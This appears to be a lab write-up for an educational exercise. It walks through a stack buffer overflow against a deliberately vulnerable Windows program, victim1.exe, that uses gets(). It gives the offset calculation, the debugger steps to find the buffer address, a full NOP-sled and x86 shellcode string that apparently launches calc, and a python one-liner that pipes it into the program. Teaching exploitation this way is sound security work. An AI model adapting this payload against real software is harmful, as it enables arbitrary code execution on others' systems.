# Attack a vulnerable program using gets() and large buffer with Python from command line

victim1.c uses the vunerable function gets(), which accepts use input and puts the input into a local buffer. The local buffer is large and can hold the entire malicious string, which includes the shellcode. 

## Attack Steps

### Step 1. Find the length of malicious string
To find the length of the malicious string, we have to look at the [stack frame](#Disassembly-of-the-main-function) of the main function. it is 1292 bytes from the local buffer until the return address (excluded).

### Step 2. Determine the shellcode address
The shellcode address may need to be changed. To find the shellcode address, load *victim1.exe* into IDA Freeware and find the *main* function address from the disassembly. Then load *victim1.exe* into *Immunity Debugger*. Set a breakpoint at the entry of the *main* function and perform *step over*. Enter a sequence of 'a's when the function gets(.) runs. Now look at the stack and find where 'a's are stored. The address of the first 'a' is the address of the local buffer and can be used as the shellcode address

### Step 3. Craft the malicious string
Malicious string = 16 '*\x90*' + 112 bytes of shellcode + 1164 '\x90'+ 3 bytes of partial address of shellcode = 1292 bytes + 3 bytes of partial address of shellcode. 
Therefore, the malicious string includes the shellcode and 3 bytes of partial address of shellcode. Those '\x90's are no operation instruction, which is an instruction and does nothing. The most significant byte of the shellcode address is null and cannot be included in the malicious string.
```
'\x90'*16+'\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7'+'\x90'*1164+'\xd4\xf9\x61'
```

### Step 4. Attack
```
python -c "print('\x90'*16+'\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7'+'\x90'*1164+'\xd4\xf9\x61')" | victim1.exe
```

## Disassembly of the main function

```
.text:004015C0 ; Attributes: bp-based frame fuzzy-sp
.text:004015C0
.text:004015C0 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:004015C0                 public _main
.text:004015C0 _main           proc near               ; CODE XREF: ___tmainCRTStartup+236â†‘p
.text:004015C0
.text:004015C0 var_500         = byte ptr -500h
.text:004015C0 argc            = dword ptr  8
.text:004015C0 argv            = dword ptr  0Ch
.text:004015C0 envp            = dword ptr  10h
.text:004015C0
.text:004015C0                 push    ebp
.text:004015C1                 mov     ebp, esp
.text:004015C3                 and     esp, 0FFFFFFF0h
.text:004015C6                 sub     esp, 510h
.text:004015CC                 call    ___main
.text:004015D1                 lea     eax, [esp+510h+var_500]
.text:004015D5                 mov     [esp], eax      ; char *
.text:004015D8                 call    _gets
.text:004015DD                 nop
.text:004015DE                 leave
.text:004015DF                 retn
.text:004015DF _main           endp
```

## Stack frame of main function
```
                                  High address
        +----------------------+  
        |                      |
        +----------------------+
        |                      |
        .                      .              -------------
        |                      |              |            |     
        +----------------------+         <-----     -------|---
        |    return address    |  4 bytes   ------> | jmp esp |
        +----------------------+                    -----------
        |      old ebp         |  4 bytes
EBP ->  +----------------------+
        |                      |  4 bytes
        +----------------------+
        |                      |  4 bytes
        +----------------------+    ---
        |                      |     /\
        .         foo          .  1280 (500h) bytes
        |                      |     \/
        +----------------------+    --- 
                                  Low address
```
